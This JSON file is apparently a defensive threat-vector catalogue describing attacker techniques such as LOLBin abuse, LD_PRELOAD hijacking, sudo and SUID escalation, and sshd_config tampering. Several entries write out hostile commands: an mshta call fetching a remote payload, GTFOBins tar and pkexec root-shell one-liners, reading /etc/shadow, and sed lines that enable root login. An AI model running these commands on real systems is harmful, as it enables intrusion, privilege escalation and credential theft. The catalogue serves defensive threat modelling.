{
    "tvm": {
        "metadata": {
            "field": "tvm",
            "icon": "\u2623\ufe0f",
            "name": "Threat Vectors",
            "description": "Threat Vectors",
            "model": true
        },
        "entries": {
            "f16deda4-65b1-4825-8042-fe15524d0ce1": {
                "name": "Abnormal Windows service creation or modification attempt",
                "model": true,
                "tlp": "clear",
                "criticality": "Medium",
                "description": "A threat actor may attempt to create Windows services in order to start and\nrun software or scripts that allow the threat actor to perform actions that\ncontrolling a Windows service allows to perform.   \n\nThis may include: Establishing persistence, runnning cryptominers, \ncommunicating with command&control, launching remote actions or moving \nlaterally.  \n\nPersistence using Windows service creation may be achieved in many ways, \nsee TVMs chained from this one.   \n\nThreat actors may try to evade detection by using well-known service names \nor names that very closely resemble something that would look legit on a \nWindows platform. For example  \"WinHTTP Web Proxy Auto-Discovery\" or \n\"TCP/IP NetBIOS Help\" [CRN-01]  \n\nSome other example for creation/change of the current state of a service\nmay appaear on a DC (Domain Controller). For example, events in the\nEventLog with ids: 7036, 7040, 7045 and 4697 indicate some of the possible\ncreation or modification of services on a DC.  \n\nCreation or modification of a service on the system may lead to\naltering in the binaries and registries of the affected system.\nSuch changes/modifications can also interfere with the other\nprocesses related to other services on the system. Each service\nhas so called threads or sub-processes related to the main one.\nA change in one service or its thread can impact or compromise\nsome of the related ones.    \n"
            },
            "80329dfd-eb12-49da-9f20-565758b55eab": {
                "name": "Abuse of 'Always-on VPN' feature on mobile device",
                "model": true,
                "tlp": "clear",
                "criticality": "High",
                "description": "The \"Always-on VPN\" feature on mobile devices is designed to ensure that all network \ntraffic is routed through a VPN tunnel, providing continuous privacy and security. \nHowever, this feature can introduce specific threat vectors if abused or improperly implemented.\n\n### Key Threat Vectors and Risks\n\n- **Malicious VPN Apps and Abuse of Permissions**    Many VPN apps, especially on Android, have been found to abuse the permissions   granted by the VPN service. Malicious or poorly designed VPN apps can:  - Harvest sensitive user data (such as SMS history and contact lists).  - Inject code or malware into network traffic.  - Route user traffic through untrusted third-party servers.  - Intercept sensitive information, including banking and social network credentials.  \nThe \"Always-on VPN\" feature, if enabled with a malicious app, ensures that *all* \ndevice traffic is exposed to the app, amplifying the potential for abuse and data exfiltration.\n\n- **Traffic Leakage Despite 'Always-on VPN'**    On Android, even with \"Always-on VPN\" and the \"Block connections without VPN\"   (VPN Lockdown) feature enabled, some traffic can leak outside the VPN tunnel.   This leakage occurs particularly when:  - The device connects to a new WiFi network and performs connectivity checks   (such as checking for captive portals).  - The leaked data can include source IP addresses, DNS lookups, HTTPS, and NTP traffic.  \nThis is a design choice in Android, and such leaks may expose user information or \ndevice identifiers to local networks or attackers, undermining the privacy guarantees \nof the VPN.\n\n- **Split Tunneling and Unintended Bypasses**    Some VPN apps or device configurations allow for split tunneling, where only certain   traffic goes through the VPN. If misconfigured, sensitive data may bypass the VPN,   exposing it to interception on insecure networks.\n\n- **Device Compromise and Credential Theft**    If a device with Always-on VPN is compromised (e.g., stolen or infected with malware),   attackers could potentially exploit the persistent VPN connection to maintain   access to internal networks or exfiltrate data. While certificate revocation and   account disabling can mitigate this, there is a window of risk before such actions are taken.  "
            },
            "4d0bd987-1430-4433-9b58-a71ba8798435": {
                "name": "Abuse of environment variable to hijack library functions",
                "model": true,
                "tlp": "clear",
                "criticality": "High",
                "description": "This threat vector focuses on the malicious use of the `LD_PRELOAD` environment \nvariable on Linux systems to hook or hijack library function calls. Attackers, \nRed Teams, and advanced persistent threats leverage this trick to intercept and \nmodify the behavior of dynamically linked libraries before the legitimate \nfunctions are called. By loading a rogue or malicious library via `LD_PRELOAD`, \nadversaries can achieve elevated privileges, persist on the target, and run \narbitrary code under the guise of otherwise legitimate processes.    \n\nScenario example: \n- An attacker already possessing local or remote administrative access to a Linux \nhost can set or modify the `LD_PRELOAD` environment variable in order to inject \ncustom libraries during program execution.   \n\n- When an application starts, the system dynamic linker reads the `LD_PRELOAD` variable \nand forces the loading of the malicious library.  \n\n- The malicious library intercepts and potentially manipulates function calls\u2014such as \nfile I/O or network operations\u2014allowing attackers to subvert security controls or \nexecute code of their choice.\n\n```bash\nLD_PRELOAD=/tmp/malicious.so /usr/bin/anyApp\n```\n\nThis indicates that a potentially unauthorized library (`/tmp/malicious.so`) is being \nforce-loaded into `anyApp`.  \n"
            },
            "49625e57-94e0-4185-8466-ac68fe15b7e1": {
                "name": "Abuse of Getsystem command for privilege escalation",
                "model": true,
                "tlp": "clear",
                "criticality": "High",
                "description": "Use of Getsystem command to elevate from a local administrator to the SYSTEM user.\nThere are different tools to do this, most popular are Cobalt Strike beacons and \nMetasploit Meterpreter payload.\n\nBoth tools first attempt to use \u201cnamed pipe impersonation\u201d to achieve SYSTEM privileges.\nThis involves creating a Windows Service to execute as NT AUTHORITY\\SYSTEM and feeding\ndata to it through a named pipe that is randomly created by the malicious payload.\n\nThe getsystem command has three techniques. The first two rely on named pipe impersonation.\nThe last one relies on token duplication.\n\n## Technique 1.\n\nIt creates a named pipe from Meterpreter. It also creates and runs a service that runs\ncmd.exe /c echo \u201csome data\u201d >\\\\.\\pipe\\[random pipe here]. When the spawned cmd.exe connects\nto Meterpreter\u2019s named pipe, Meterpreter has the opportunity to impersonate that security \ncontext. Impersonation of clients is a named pipes feature. \nThe context of the service is SYSTEM, so when you impersonate it, you become SYSTEM.\n\n## Technique 2.\n\nIt is like technique 1. It creates a named pipe and impersonates the security context of\nthe first client to connect to it. To create a client with the SYSTEM user context,\nthis technique drops a DLL to disk(and schedules rundll32.exe as a service to run the\nDLL as SYSTEM. The DLL connects to the named pipe.\n\n## Technique 3.\n\nIt is a little different. This technique assumes you have SeDebugPrivileges\u2014something getprivs\ncan help with. It loops through all open services to find one that is running as SYSTEM and\nthat you have permissions to inject into. It uses reflective DLL injection to run its elevator.dll\nin the memory space of the service it finds. This technique also passes the current thread id \n(from Meterpreter) to elevator.dll. When run, elevator.dll gets the SYSTEM token, opens the primary \nthread in Meterpreter, and tries to apply the SYSTEM token to it.\n\nThis technique\u2019s implementation limits itself to x86 environments only. On the bright side, \nit does not require spawning a new process and it takes place entirely in memory.\n"
            },
            "b663b684-a80f-4570-89b6-2f7faa16fece": {
                "name": "Abuse of Microsoft Office Applications",
                "model": true,
                "tlp": "clear",
                "criticality": "Medium",
                "description": "An employee named receives an email that appears to be from a trusted business \npartner or colleague. The email contains an office document. The end-user clic on it.\n\nThe attached file, is a macro-enabled Word document. It usually pops-up with \nthe following message :\n\"This document was created in an earlier version of Microsoft Word. \nPlease click 'Enable Content' above to view the full document.\"\n\nThis message is designed to entice end-user to enable macros or active content, \nwhich is disabled by default for security reasons.\n\nBy clicking ont it, it allows the embedded macro, written in \nVisual Basic for Applications (VBA), to execute without further prompts.\n\nOnce executed, the macro initiates a hidden process that launches Windows PowerShell, \nwhich run:\n\n- Run silently without displaying a window to the user.\n- Bypass execution policies that normally restrict script running.\n- Connect to an external server controlled by the attacker.\n- Download and execute additional malicious code or a payload.\n\nThreat actors may also modify Windows Registry settings related to \nMicrosoft Office security.\n\n- Disabling the COM Kill Bit: This involves changing registry values \nthat control the activation of certain COM objects or ActiveX controls \nwithin Office applications. By disabling the \"kill bit,\" the threat actor \nre-enables outdated or vulnerable components that can be exploited.\n\n- Altering Macro Security Settings: Changing registry keys to lower the \nmacro security level, allowing macros to run without prompts in the future.\n\nTo maintain long-term access to the compromised system, \nthe attacker may target Microsoft Outlook.\n\n- Embedding Malicious Code in Outlook's VBA Project:\n- The attacker adds VBA code to Outlook's VbaProject.otm file.\nThis code executes every time Outlook starts, performing actions without the user's knowledge."
            },
            "767f10bd-1947-44e3-b999-5fbf50d99027": {
                "name": "Abuse of mshta",
                "model": true,
                "tlp": "clear",
                "criticality": "High",
                "description": "Mshta.exe is a legitimate Microsoft binary used for executing \nMicrosoft HTML Application (HTA) files. Because mshta.exe is digitally signed \nby Microsoft, malicious actors often abuse it as a \"Living off the Land\" binary \n(LOLBin) to evade detection. Attackers can craft malicious HTA or VBScript code \nand pass it to mshta.exe, effectively bypassing many traditional endpoint \nsecurity controls.  \n\nThreat actors have leveraged mshta.exe to stealthily download and execute \nmalicious payloads. By embedding or obfuscating their scripts within HTML \nor JavaScript code, adversaries can launch mshta.exe to pull additional \nmalware from remote servers.  \n\nMshta.exe can also be invoked using command-line arguments that specify \na remote or local HTA file. An example of such an abuse might look like:  \n\n```bash\nmshta.exe https://malicious[.]domain/payload.hta\n```\n\nor\n\n```bash\nmshta.exe C:\\Path\\To\\MaliciousScript.hta\n```\n\nOnce executed, mshta.exe runs with the same privileges as the invoking user \n(or higher, if misconfigurations or stolen credentials allow for elevated privileges).\n"
            },
            "52cd3405-ddd8-40cd-be83-640a21c2b4c4": {
                "name": "Abuse of special permission via chmod on files",
                "model": true,
                "tlp": "clear",
                "criticality": "High",
                "description": "Attackers leverage the `chmod` utility to set the SUID (Set Owner User ID), \nthe SGID (Set Owner Group ID), or the Sticky bit on executables or scripts. \nBy abusing these bits, an adversary can temporarily inherit root- \nor group-level privileges when the affected file is executed.  \n\nThis effectively grants them elevated rights that can be used to move laterally \nwithin the environment, access or exfiltrate sensitive data, or escalate \nprivileges to maintain a stronger foothold on the system.  \n\nExamples of SUID, SGID, and Sticky bit abuse:\n\nSUID shell: Attackers can create a file with the setuid bit set and owned\nby the root user, and then use that file to gain root privileges and \nexecute a shell with root privileges.\n\nSGID exploit: Attackers can find a file with the setgid bit set and owned\nby a group that has elevated privileges, and then use that file to gain the\nprivileges of that group.\n\nSticky bit exploit: Attackers can set the sticky bit on a file to prevent\nit from being deleted or renamed, and then use that file to store malicious\ncode or data.\n\nIn many Linux-based distributions (and similarly on macOS systems), \n`chmod` is widely available and not restricted in typical configurations. \nAttackers can take advantage of this by running commands such as:\n\n```bash\nchmod u+s /path/to/executable\n```\n\nor\n\n```bash\nchmod g+s /path/to/executable\n```\nDepending on permissions misconfigurations, these commands may succeed if the \naccount in use has the necessary rights or if the system\u2019s sudo settings \nare overly permissive.  \n\nOnce the SUID or SGID bit is set on a critical binary, any user running that \nbinary subsequently executes it with elevated privileges. Threat actors have \nbeen observed employing this technique to gain root-level access, tamper with \nsystem logs, exfiltrate proprietary data, or introduce backdoors for persistence.  \n"
            },
            "d5039f2c-9fcc-4ba3-ad6a-da8c891ba745": {
                "name": "Abuse of Windows Utilities",
                "model": true,
                "tlp": "clear",
                "criticality": "Medium",
                "description": "Advanced threat actors frequently abuse legitimate Windows utilities to execute \nmalicious code, evade detection, and maintain persistence. This technique, known \nas Living off the Land Binaries (LoLBins), leverages trusted applications to \ncarry out unauthorized actions."
            },
            "66277f27-d57b-47f8-bc9c-b024c7cd1313": {
                "name": "Abuse Windows Utilities to Enable Persistence",
                "model": true,
                "tlp": "clear",
                "criticality": "High",
                "description": "1. Msdeploy.exe\\\n**Description**: The Microsoft Web Deployment Tool used for syncing content\nand configurations. Threat actors can deploy web shells or \nmalicious applications to servers.\n\nExamples:\n\n```python\nmsdeploy.exe -verb:sync -source:contentPath=C:\\malicious_site -dest:contentPath=\"Default Web Site\"\n```\nThis command synchronizes the contents from the local directory C:\\malicious_site \nto the IIS web application named \"Default Web Site\". It deploys or updates the web \ncontent of the default website with the files from C:\\malicious_site.\n\n```python\nMsdeploy.exe -verb:sync -source:runCommand=\"cmd /c start malicious.exe\" -dest:auto,computerName=target-server\n```\nThis command uses Msdeploy.exe to run a command on a remote server (target-server)\nthat starts a malicious executable (malicious.exe), allowing the attacker to maintain\npersistence and execute code under the guise of a legitimate process.\n\n2. Shadow.exe\\\n**Description**: A Terminal Services command that monitors or controls \nRemote Desktop sessions. Threat actors can hijack sessions \nto maintain persistence or spy on users.\n\nExample:\n\n```python\nshadow.exe 1 /server:target-server\n```\nUsing shadow.exe, an attacker can connect to an active RDP session on target-server, \npotentially allowing them to observe or control the session without the user's knowledge. \nThis can be used to capture sensitive information or further compromise the system."
            },
            "86f62c3a-6556-4a64-a9f5-a79168ad42d9": {
                "name": "Abuse Windows Utilities to Side-Load Malicious DLLs",
                "model": true,
                "tlp": "clear",
                "criticality": "Medium",
                "description": "### 1. Squirrel.exe\n\n**Description**: Associated with the Squirrel installation/update framework. \nThreat actors can perform DLL side-loading by placing a malicious DLL \nthat squirrel.exe loads during execution.\n\nExample:\n\n> Attackers place a malicious DLL named Squirrel.dll in the same directory as squirrel.exe.\n\n```\nC:\\Program Files\\App\\Squirrel.exe\nC:\\Program Files\\App\\Squirrel.dll  (malicious)\n```\n\n### 2. Tracker.exe\n\n**Description**: A Windows process related to search indexing. \nIt can be abused for DLL side-loading.\n\nExample:\n\n> An attacker places a malicious DLL named tracker.dll in the same directory as tracker.exe.\n\n```\nC:\\Windows\\System32\\tracker.exe\nC:\\Windows\\System32\\tracker.dll  (malicious)\n```\n\n### 3. Tttracer.exe and Ttdinject.exe\n\n**Description**: Part of the Windows Time Travel Tracing toolset. \nThreat actors can inject code into processes or load malicious DLLs.\n\nExample:\n\n```\nttdinject.exe -p <PID> -l C:\\path\\to\\malicious.dll\n```\n\n## 4. Wmiprvse.exe\\\n\n**Description**: stands for Windows Management Instrumentation Provider Service\nThreat actors can exploit wmiprvse.exe for DLL side-loading by placing malicious WMI provider \nDLLs that wmiprvse.exe loads during execution.\n\nExample:\n\n```\nC:\\Windows\\System32\\wbem\\wmiprvse.exe\nC:\\Windows\\System32\\wbem\\malicious_provider.dll  (malicious)\n```\n\n### 5. InstallUtil.exe\\\n\n**Description**: A command-line utility that allows for the installation \nand uninstallation of resources by executing installer components specified \nin .NET assemblies. Threat actors can run malicious code by passing a crafted assembly.\n\nExample:\n\n```\nInstallUtil.exe /logfile= /LogToConsole=false /U C:\\path\\to\\malicious.dll\n```\n\n### 6. Odbcconf.exe\\\n\n**Description**: Configures ODBC drivers and data source names. Can be used to execute DLLs.\n\nExample:\n\n```\nodbcconf.exe /S /A {REGSVR C:\\path\\to\\malicious.dll}\n```"
            },
            "3b1026c6-7d04-4b91-ba6f-abc68e993616": {
                "name": "Abusing Lolbins to Enumerate Local and Domain Accounts and Groups",
                "model": true,
                "tlp": "clear",
                "criticality": "High",
                "description": "Adversaries may attempt to enumerate the environment and list all\nlocal system and domain accounts or groups.  \nTo achieve this purpose, they can use variety of tools and techniques.  \nTheir goal is reconnaissance, gathering of user's account information on \nthe system or in the domain and further usage of accounts with higher \nprivilege access.\n\n\n### For Windows OS:\n\nOn Windows platforms threat actors can use the net utility or dsquery,\nas examples as lolbins. Net utility commands, as examples, are executed\nwith additional parameters like \"net localgroup\", \"net user\" for\nadministrators and guest accounts. For domain users and groups net\nutility commands are used with the parameter /domain.  \n\nExamples:   \n\n- net user /domain\n- net group /domain\n- net localgroup on localhost\n- net user on localhost\n- net localgroup \"Administrators\" on localhost\n\nExecutable files net.exe or net1.exe are indicators for accounts enumeration.\n\"Net1.exe\" resides in \"C:\\Windows\\System32\" like \"net.exe\" and indicates process \nknown as Net Command or Application Installer. These .exe files are usually related \nto run applications, batch files, and scripts that call Net utility.  \n\nThreat actors may enumerate currently or previously connected users, or a subset\nof users as for example administrative users.  \n\n### For Linux OS (including Windows Subsystem for Linux):\n\nHere some example of commands typically used for discovery on accounts \nand groups.\n\n- whoami        #current user (often used in legitimate scripts)\n- hostname      #show or set the system's host name\n- id            #print real and effective user and group IDs\n- uname         #print system information\n- arp\n- users\n- netdiscover\n- ifconfig\t  #configure a network interface\n- nmap\n- ps            #report a snapshot of the current processes\n- netstat\n- uname\n- issue\n- groups\n- tcpdump\n- sudo -l\n- cat /etc/shadow\n- cat /etc/passwd # other command could be used to list the content of the file ex: 'less', 'more' etc.\n- cat /etc/group  # Groups\n- cat /etc/sudoers # File that allocate system rights to users\n- last            # most recent login sessions\n- ldapsearch      # Get information from LDAP server\n- rpcclient       # Command-line utility used to interact with Microsoft RPC protocol. Could be used to enumerate AD\n- finger          #  user information lookup command \n"
            },
            "fc858766-0618-4a4f-973c-526402a83582": {
                "name": "Abusing Lolbins to Enumerate Network Configuration",
                "model": true,
                "tlp": "clear",
                "criticality": "High",
                "description": "System Network Configuration Discovery refers to an adversary\u2019s effort to gather\nand enumerate network-related information from compromised systems. This activity \nis often a precursor to more aggressive tactics, including lateral movement \nor data exfiltration. By executing commands or employing specific utilities to \ndetermine active network interfaces, routing tables, firewall states, and open ports, \nthreat actors can map out an organization\u2019s network architecture. \nThis information allows them to identify potential choke points, pivot opportunities, \nand security gaps that could be exploited in subsequent stages of an attack.\n\n## Common Tools & Commands\n### Windows  \n\n1) cmd.exe:  - `ipconfig` to display IP addresses and network interfaces.   - `netstat` to list active TCP/UDP connections and listening ports.  - `route print` to display routing tables.  \n\n2) powershell.exe:   - `Get-NetIPConfiguration` to display IP addresses and network interfaces.   - `Get-NetTCPConnection` to display active network connections.  - `Get-NetRoute` to display routing tables.  \n\n3) netsh.exe:   - `netsh interface ip show config` for advanced interface information.   - `netsh interface ip show dns` to display DNS settings.\n\n4) nslookup.exe:   - `nslookup <domain_name>` to display DNS records for a domain name. \n\n5) wmic.exe:   - `wmic nic get` to display network interface settings.  - `wmic route get` to display routing tables.\n\n### Linux and macOS   - `ifconfig` or `ip` to show IP address configuration and network interfaces.    - `arp` to examine the ARP table for link-layer address mapping.    - `netstat` or `ss` to display active connections and listening services.    - `route` to view or modify the IP routing table.    - `iptables`, `firewall-cmd`, `ufw` to query or adjust firewall settings.    - `dig` to query DNS servers and display DNS records."
            },
            "63ab0120-28bc-4081-8184-c45d68b144b2": {
                "name": "access to management plane of security, network, or endpoint management appliances",
                "model": true,
                "tlp": "clear",
                "criticality": "Severe",
                "description": "### overall description\nCyber espionage threat actors continue to target technologies that do not \nsupport endpoint detection and response (EDR) solutions such as firewalls, \nIoT devices, hypervisors, VPN technologies (e.g. Fortinet, SonicWall, \nPulse Secure, and others) or endpoint management solutions like \nEndpoint Manager Mobile (EPMM).  \n\nThose targets are often delivered as appliances (bundle of hardware and \nsoftware) and most of the time they do not have full-fleshed OS features \nand come with limited command line interfaces.  \n\nBest practice is to have out-of-band (OoB) management from a central \nmanagement console (dedicated network segment).  \n\nNetwork seggregation, identity and access management for this OoB segment \nhas to be strictly configured and monitoring in place to detect any unusual\nsource, account or actions performed.  \n\nThis can be a challenging objective as it depends on the level of verbosity\nof aufit logs (if any).  \n\nIf configuration is loose or management access is inadvertly allowed \nfrom other interfaces, attackers may use valid accounts to access the \nmanagement plane of the device.  \n\nMoreover those devices are most of the time by definition inline of \nnetwork flows coming from Internet. Attacker may obtain a Zero-day \nvulnerability resulting in access to command line interface of the \ndevice from the Internet-facing interfaces or privileged access \n(adminitrator).\n\n### examples of specific attacks\n#### attack against Fortinet Fortigate firewall\nThe attack against Fortigate is an illustration of the latter.  \nThe following appliances have been in scope:  - FortiGate: FortiGate units are network firewall devices which allow   for the control and monitoring of network traffic passing through the  devices.  - FortiManager: The FortiManager acts as a centralized management  platform for managing Fortinet devices.  - FortiAnalyzer: The FortiAnalyzer acts as a centralized log management   solution for Fortinet devices as well as a reporting platform.\n\nThe following steps generally describe the actions the threat actor took:  - Utilized a directory traversal zero-day (CVE-2022-41328) exploit to   write files to FortiGate firewall disks outside of the normal bounds   allowed with shell access.  - Maintained persistent access with Super Administrator privileges within   FortiGate Firewalls through ICMP port knocking   - Circumvented firewall rules active on FortiManager devices with a   passive traffic redirection utility, enabling continued connections to   persistent backdoors with Super Administrator privileges  - Established persistence on FortiManager and FortiAnalyzer devices   through a custom API endpoint created within the device  - Disabled OpenSSL 1.1.0 digital signature verification of system files   through targeted corruption of boot files \n\n#### attack against Ivanti Endpoint Manager Mobile (EPMM) \n\"An authentication bypass vulnerability in Ivanti EPMM allows unauthorized \nusers to access restricted functionality or resources of the application \nwithout proper authentication,\"  \n\nA \"trusted source\" informed Ivanti that CVE-2023-35078 was exploited in \nattacks against a limited number of customers.  \n"
            },
            "2404055a-10f8-4c50-9e9b-0f26756e7838": {
                "name": "Access token manipulation",
                "model": true,
                "tlp": "clear",
                "criticality": "High",
                "description": "### Access token:\n\nAn access token is part of the logon session of the user, and it also contains their credentials for\nWindows single sign on (SSO) authentication to access local or remote network services.\n\nWhen a user signs on to a machine ((irrespective of the logon type), the system generates an \naccess token for them. With this access token, Windows handles the user identification,\nsecurity, and access rights on the system.\n\n### Access token manipulation:\n\nAn attacker can manipulate access tokens to make a process appear to be initiated by a different\nuser account, when in reality, the request was originated by the account of the attacker.\n\nAttackers use access tokens to escalate privileges from administrative to SYSTEM level,\nallowing them to undertake malicious operations and remotely access systems in the corporate network.\n\n### Manipulating access token by injecting malware:\n\n- If the current logged-on user on the compromised or infected machine is a member of the administrator  group of users or is running a process with higher privileges (e.g., by using the \u201crunas\u201d command),  malware can take advantage of the privileges of the process\u2019s access token to elevate its privileges  on the system, allowing it to perform privileged tasks.\n\n- Malware can enumerate the Windows processes running with higher privileges (typically SYSTEM level privileges),  obtain the access tokens for those processes, and utilise the acquired token to launch new processes.  As a result, the new process is launched in the context of the SYSTEM user, as represented by the token.\n\n- Malware can also perform a token impersonation attack, in which it copies the access tokens of higher-level  SYSTEM processes, converts them into impersonation tokens using appropriate Windows functionality,   and then impersonates the SYSTEM user on the infected machine, thereby elevating its privileges.\n\n### Methods used to manipulate access tokens:  \n\n- Theft of access tokens.  An attacker can copy and use existing tokens from other processes to undertake malicious activities using   the built-in Windows API functions:    - To make duplicate tokens of existing access tokens, utilise the DuplicateTokenEx() function.    - The ImpersonateLoggedOnUser() function is used to run the process as another user.    - Attackers can assign an impersonated token to a thread using the SetThreatToken() function.\n\n- Using a stolen access token to create a new process.  Use the CreateProcessWithTokenW() function to create a new process with a duplicated token. The attackers  can use this function to generate tokens that implement the security context of any user they want to impersonate.\n\n- Creating Logon sessions.  If an attacker has the credentials for any user account, they can use the LogonUser() function to create logon   sessions for them remotely. They can then gain a token from the security context of the logged in user,   which they can give to a thread to launch a process.\n"
            },
            "a8c7b250-a2d4-4a0d-82f8-23dc99c77d7b": {
                "name": "Addition of credentials to OAuth applications and service principals",
                "model": true,
                "tlp": "clear",
                "criticality": "Emergency",
                "description": "The actor has been observed adding credentials (x509 keys or password\ncredentials) to one or more legitimate OAuth Applications or Service\nPrincipals, usually with existing Mail.Read or Mail.ReadWrite permissions,\nwhich grants the ability to read mail content from Exchange Online via\nMicrosoft Graph or Outlook REST. Examples include mail archiving\napplications. Permissions are usually, but not always, AppOnly.\n\nThe actor may use their administrator privileges to grant additional\npermissions to the target Application or Service Principal (e.g.  Mail.Read,\nMail.ReadWrite)."
            },
            "19a7a12e-1c7a-4885-9359-56abd63c85c9": {
                "name": "ADFS abuse",
                "model": true,
                "tlp": "clear",
                "criticality": "High",
                "description": "AD FS (Active Directory Federation Services) is a critical identity provider solution \nfor secure SSO authentication, but it presents a significant attack surface for \nthreat actors. Below is a comprehensive overview of ADFS abuse threat vectors, attack \ntechniques, and real-world exploitation patterns based on current research and incident data.\n\n### Memory Adapter Manipulation\n\nAttackers with local administrative privileges on an AD FS server can modify AD \nFS-related .NET assemblies or configuration files (such as those in the Global Assembly Cache). \nBy injecting malicious code or altering authentication logic in memory or on disk, \nthey can compromise the authentication process, potentially allowing unauthorised access.\n\n### Golden SAML Attacks\n\nAttackers can steal or forge SAML tokens by accessing the AD FS token signing certificates. \nWith these certificates, they can create valid SAML tokens impersonating any user, \ngranting themselves unauthorised access to federated applications (such as Microsoft 365).\n\n### Phishing & MFA Bypass\n\nPhishing campaigns specifically target AD FS users, tricking them into entering \ncredentials on fake login pages. Once credentials are harvested, attackers may intercept \nMulti-Factor Authentication (MFA) codes or session cookies in real time, bypassing \nMFA protections.\n\n### Information Disclosure via Vulnerabilities  \nHistorical vulnerabilities (like CVE-2017-0043) have allowed authenticated attackers \nto read sensitive information from AD FS servers via crafted XML requests. While \nmany such vulnerabilities are patched, they highlight the risk of information leakage.\n\n### Credential Reuse and Lateral Movement\n\nAttackers who obtain AD FS credentials often find that these credentials are reused \nacross other systems or SSO platforms. This allows them to move laterally within \nthe victim\u2019s environment, accessing multiple services.\n"
            },
            "02810748-52b5-4d3a-a788-29a948538cd2": {
                "name": "Admin SMB shares privilege escalation exploit",
                "model": true,
                "tlp": "clear",
                "criticality": "Medium",
                "description": "One of the most common ways adversaries leverage SMB and Windows Admin\nShares is in conjunction with another technique, T1570: Lateral Tool\nTransfer. In other words, they move payloads from one endpoint to another\nand execute them. Adversaries do this with native utilities like net.exe or\nthrough functionality provided by command and control (C2) frameworks - to\nname just a couple of the many options available. Additionally, adversaries\ncan use Admin Shares for privilege escalation using tools like PsExec, a \nSysinternals tool that enables remote system management.\n\n### Possible patterns of malicious activity\n\n- Remote file copy and retrieval - attackers can use tools such as SMBexec to \ncreate a temporary share to copy files to and then remotely parse their \ncontents. An adversary could accomplish this similarly by leveraging tools \nlike WMIexec or MMCexec.\n\n- Lateral movement and privilege escalation - Most C2 Frameworks provide \nbuilt-in functionality for lateral movement or privilege escalation utilizing \nPsExec-like functionality. In the case of Cobalt Strike, beacons leverage the \nService Control Manager to copy a binary to the ADMIN$ share on the target \nendpoint and leverage a service for execution.\n\nCommon offensive and dual-use tools that leverage SMB/Windows Admin Shares \ninclude:\n\n- PsExec\n- Impacket's SMBexec and WMIexec\n- `net.exe`\n- Probably all C2 frameworks (commercial and open source)\n"
            },
            "422098a7-567e-47fe-9e92-9fd3ec6df768": {
                "name": "Adversary abuses sudo elevation control mechanism",
                "model": true,
                "tlp": "clear",
                "criticality": "High",
                "description": "Sudo is a command-line utility for Unix and Linux-based systems that can\nprovide an effective way to give specific user permissions to run root\n(most powerful) level commands on the system. Unfortunately, some\nmisconfigurations in sudo functionality can allow threat actors to escalate\ntheir privileges to root access.\n\nIf the file /etc/sudoers (used to store all sudo privileges) is modified\nthis can grant to the attacker elevation of privileges. Attackers may use\ncustom parameters with sudo to edit the sudoers file. For example -f or -l\ncan be used to edit this file or list which commands or binaries the\ncurrent user has access to run.\n\nGTFOBins is a list of Unix binaries which is used by the threat actors to\nbypass local security restrictions in misconfigured systems. GTFOBins\nallows to search for binaries or commands whether they are executed as sudo\nand if they provide access to normally restricted actions. The repo list\ncontains 300+ commands that could be abused for different purposes if not\nconfigured using this filter. The current list is an open collaborative\nproject. Link: https://gtfobins.github.io/#+sudo\n\nExamples: \n\nA \"tar\" option can be exploited to write to arbitrary files (works only for\nGNU tar). If write data to files, it may be used for privileged writes on\nthe files ouside a restricted file system. A \"tar\" command can break out\nfrom restricted environments, using spawn of an interactive system shell.\n\nReference: https://gtfobins.github.io/gtfobins/tar/\n\ntar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh\n\nFor GNU tar:\ntar xf /dev/null -I '/bin/sh -c \"sh <&2 1>&2\"'\n\nor (for GNU tar when limited command argument injection is available)\n\nTF=$(mktemp)\necho '/bin/sh 0<&1' > \"$TF\"\ntar cf \"$TF.tar\" \"$TF\"\ntar xf \"$TF.tar\" --to-command sh\nrm \"$TF\"*\n\nThe pkexec command can be exploited to gain a root shell and to access the\nfile system, escalate or maintain privilege access. \n\nReference: https://gtfobins.github.io/gtfobins/pkexec/\n\nsudo pkexec /bin/sh\n"
            },
            "66aafb61-9a46-4287-8b40-4785b42b77a3": {
                "name": "Adversary in the Middle phishing sites to bypass MFA",
                "model": true,
                "tlp": "clear",
                "criticality": "Medium",
                "description": "Threat actors use malicious attachments to send the users \nto redirection site, which hosts a fake MFA login page.\nThe MitM page completes the authentication flow by interfacing\nwith the legitimate IdP, and captures valid accounts"
            },
            "d24f2b4a-80fc-4ee7-9293-3f6e9e3bbbe4": {
                "name": "Adversary publishing malicious NPM packages to compromise software",
                "model": true,
                "tlp": "clear",
                "criticality": "Low",
                "description": "Threat actors use a technique which includes updating of NPM packages\nwith malicious code to deceive a developer or an end-user to download\nand install them. This attack vector is used to steal profile and\nsystem data from the developer's systems.    \n\nIn one of the threat actor's campaigns was observed that multiple\ncryptocurrency-related packages are targeted, and the popular\ncountry-currency-map package was downloaded thousands of times\na week. The malicious code is found in two heavily obfuscated\nscripts, \"/scripts/launch.js\" and \"/scripts/diagnostic-report.js,\"\nwhich execute upon the package installation ref [1].    \n\nThe threat actor steals the device's environment variables and sends\nthem to a remote host. The threat actor's groups are targeting environment\nvariables as they can contain API keys, database credentials, cloud\ncredentials, and encryption keys, which can be used for further attacks."
            },
            "b32ced71-138b-4076-8376-4f13161af4b0": {
                "name": "Alteration of sshd_config file",
                "model": true,
                "tlp": "clear",
                "criticality": "High",
                "description": "This threat vector highlights the risk associated with unauthorized access or \nalteration of the `sshd_config` file on Linux systems. Adversaries who manage \nto gain elevated privileges (root or sudo) can modify SSH service parameters \nin `sshd_config` to allow additional keys, redirect ports, or weaken \nauthentication requirements.  \n\nPossible scenario done by a threat actor :\n\n### Adding Rogue SSH Keys\nAn attacker with root or sudo privileges could append a malicious public key to \nthe authorized_keys directive in sshd_config. For instance:\n\n```bash\necho \"AuthorizedKeysFile /etc/ssh/my_malicious_keys\" >> /etc/ssh/sshd_config\n```\nThey might then place their public key in that file. This allows them to log in \nvia SSH without needing a password, often bypassing standard detection.  \n\n### Enabling Root Login\nIf an organization has wisely disabled direct root login, an attacker could revert \nthat setting in sshd_config:\n\n```bash\nsed -i 's/^#PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config\n```\nBy doing so, they allow themselves to authenticate as root directly.  \n\n### Allowing Password Authentication\nIn secure environments, SSH often requires key-based authentication. \nAn attacker might weaken this by enabling password-based access and choosing \neasy-to-guess credentials:\n\n```bash\nsed -i 's/^PasswordAuthentication.*/PasswordAuthentication yes/' /etc/ssh/sshd_config\n```\nOnce changed, brute-force or credential-stuffing techniques become more feasible, \nhelping the adversary maintain illicit access.  \n\n### Redirecting SSH Ports\nDefenders commonly monitor TCP port 22 for suspicious activities. An attacker \ncould modify sshd_config to run 